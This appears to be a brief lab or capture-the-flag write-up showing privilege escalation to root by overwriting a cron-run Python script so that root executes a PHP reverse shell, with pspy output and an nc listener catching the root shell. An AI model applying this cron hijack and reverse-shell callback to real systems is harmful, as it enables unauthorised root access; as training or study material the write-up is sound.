# 5 privesc > root

## Cron Exploitation

```
cat << EOF > cleanup.py
#!/usr/bin/env python
import os
import sys
try:
	os.system('/usr/bin/php /var/www/html/booked/kashz.php')
except:
	print 'ERROR...'
sys.exit(0)
EOF

# pspy
2021/08/23 15:42:01 CMD: UID=0    PID=21371  | /bin/sh -c    python /var/www/html/booked/cleanup.py

$ nc -lvnp 3306
listening on [any] 3306 ...
connect to [192.168.49.175] from (UNKNOWN) [192.168.175.64] 35248
SOCKET: Shell has connected! PID: 21483
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```
